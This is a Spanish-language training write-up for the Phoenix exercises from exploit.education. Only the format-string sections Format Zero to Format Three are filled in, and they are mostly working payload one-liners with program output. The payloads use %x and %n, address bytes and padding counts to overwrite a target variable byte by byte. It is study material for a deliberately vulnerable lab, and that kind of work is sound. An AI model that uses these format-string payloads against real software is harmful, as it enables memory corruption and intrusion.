---

layout: default
title: "Phoenix-Exploit Education"
permalink: /Phoenix-EE/
---

# Phoenix-Exploit Education

## Stack Zero
## Stack One
## Stack Two
## Stack Three
## Stack Four
## Stack Five
## Stack Six

## Format Zero

Como hablamos de formatos, nos referimos a los que tienen **%** como por ejemplo **%s**, **%i**, **%p**, **%x** o **%d** entre otros. En este caso usaremos **%x**, unas cuantas veces para formar el  error del bug.

Ahora haremos lo siguiente:

```bash
$ python -c "print '%x'*20" | ./format-zero

Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Format One

```bash
$ python -c "print '%32x\x6c\x4f\x76\x45'" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!

```

## Format Two

```bash
user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-two | grep changeme
08049868 B changeme

user@phoenix-amd64:~$ /opt/phoenix/i486/format-two AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAA.ffffd89c.100.0.f7f84b67.ffffd6f0.ffffd6d8.80485a0.ffffd5d0.ffffd89c.100.3e8.41414141.Better luck next time!

user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(echo -e "\x68\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n.")
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd8a81000f7f84b67ffffd700ffffd6e880485a0ffffd5e0ffffd8a81003e8.Well done, the 'changeme' variable has been changed correctly!
```

## Format Three

Empezaremos con obtener la direccion de la variable **changeme** y luego vemos cuando **%x** hay que agregar para que salgan nuestras **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-three | grep changeme
08049844 B changeme

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 41414141 
Better luck next time - got 0x00000000, wanted 0x64457845!
```

Ahora restamos un **%x** y lo reemplazamos por un **%n**. Tambien a su vez cambiamos las **AAAA** por la direccion de memoria de donde apunta nuestra variable **changeme**. 

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 8049844 
Better luck next time - got 0x00000000, wanted 0x64457845!

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000045, wanted 0x64457845!
```

Como podemos ver, hemos escrito en el byte primero pero, nos faltan 3 bytes mas. Entonces ingresaremos en la parte de adelante las otras direcciones (de los siguientes 3 bytes) para ver cual es el resultado.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000051, wanted 0x64457845!
```

Como podemos ver, se a desplazado los bytes, por ello, lo que haremos será usar esta informacion para desplazar caracteres usando **A**. Haciendo un pequeño calculo, necesitamos saber cuantas **A** se necesita agregar para que 45 llegue a 51, entonces hariamos una pequeña resta de 45-51, pero como esto nos da una resta negativa, pero si sobrepasa el byte no nos importa puesto que eso podemos arreglarlo en el siguiente byte. Entonces haremos la resta de 145-51.

```bash
>>> int("145",16)-int("51",16)
244

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00000145, wanted 0x64457845!
```

Luego agregamos el siguiente %n para ver, como se encuentra nuestro segundo byte al sobrescribir.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00014545, wanted 0x64457845!
```

Ahora, realizamos lo mismo con el siguiente byte, lo cual seria 78-45.

```bash
>>> int("78",16)-int("45",16)
51

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00017845, wanted 0x64457845!
```

Y volvemos a hacer lo mismo para el siguiente byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x01787845, wanted 0x64457845!

>>> int("145",16)-int("78",16)
205

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x02457845, wanted 0x64457845!
```

Y para el ultimo byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45457845, wanted 0x64457845!

>>> int("64",16)-int("45",16)
31

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'A'*31+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

## Format Four

## Heap Zero
## Heap One
## Heap Two
## Heap Three
## Net Zero
## Net One
## Net Two
## Final Zero
## Final One
## Final Two

